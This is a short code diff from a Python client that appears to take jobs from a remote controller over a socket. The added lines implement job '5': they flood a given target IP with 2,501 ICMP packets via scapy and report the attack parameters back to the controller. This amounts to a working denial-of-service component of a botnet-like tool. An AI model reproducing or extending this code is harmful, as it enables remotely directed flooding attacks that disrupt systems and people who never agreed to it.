@@ -100,6 +100,13 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
             elif JOB[0] == "5":
                 remain = JOB[2:].split()
                 target_ip = remain[0]
+                target_port = remain[1]
+                loop = 2500 + 1
+                for x in range(0, loop):
+                    send(IP(dst=target_ip)/ICMP(), verbose=0)
+                    print(".", end="", flush=True)
+                client.sendall(str.encode(command))
+                client.sendall(str([target_ip, target_port, loop, 4]).encode())
             else:
                 print("NO JOB TAKEN")
             continue
